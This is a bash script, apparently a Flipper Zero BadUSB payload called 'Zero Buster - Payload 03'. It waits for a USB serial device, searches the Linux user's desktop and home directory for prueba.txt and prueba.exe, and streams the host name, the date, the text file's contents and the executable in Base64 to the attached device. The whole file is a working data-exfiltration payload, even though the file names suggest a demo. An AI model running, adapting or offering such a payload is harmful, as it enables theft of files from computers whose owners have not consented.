#!/bin/bash
# ==============================================================================
# Zero Buster - Payload 03: Linux Files (prueba.txt and prueba.exe)
# ==============================================================================
# Locate test.txt (plain text) and test.exe (Base64 encoded) on the user's
# desktop and send them locally to the Flipper Zero over USB serial.
# ==============================================================================

for i in $(seq 1 60); do
    dev=$(ls -t /dev/ttyACM* 2>/dev/null | head -n1)
    [ -n "$dev" ] && break
    sleep 0.2
done

if [ -n "$dev" ]; then
    sleep 0.5
    (
        d="$HOME/Desktop"
        [ ! -d "$d" ] && d="$HOME/Escritorio"
        [ ! -d "$d" ] && d="$HOME"
        echo '=== ZERO BUSTER (LINUX FILES) ==='
        echo "Host: $(hostname)"
        echo "Desktop: $d"
        echo "Date: $(date)"
        echo "----------------------------------------"
        tf="$d/prueba.txt"
        [ ! -f "$tf" ] && [ -f "$HOME/prueba.txt" ] && tf="$HOME/prueba.txt"
        if [ -f "$tf" ]; then
            echo "[+] Found: $tf"
            echo "--- BEGIN prueba.txt ---"
            cat "$tf"
            echo ""
            echo "--- END prueba.txt ---"
        else
            echo "prueba.txt NOT FOUND (Checked: $d/prueba.txt, $HOME/prueba.txt)"
        fi
        echo "----------------------------------------"
        ef="$d/prueba.exe"
        [ ! -f "$ef" ] && [ -f "$HOME/prueba.exe" ] && ef="$HOME/prueba.exe"
        if [ -f "$ef" ]; then
            echo "[+] Found: $ef"
            echo "--- BEGIN prueba.exe (BASE64) ---"
            base64 "$ef" 2>/dev/null
            echo "--- END prueba.exe (BASE64) ---"
        else
            echo "prueba.exe NOT FOUND (Checked: $d/prueba.exe, $HOME/prueba.exe)"
        fi
        echo "========================================"
        echo '<<<EOF>>>'
    ) > "$dev"
fi
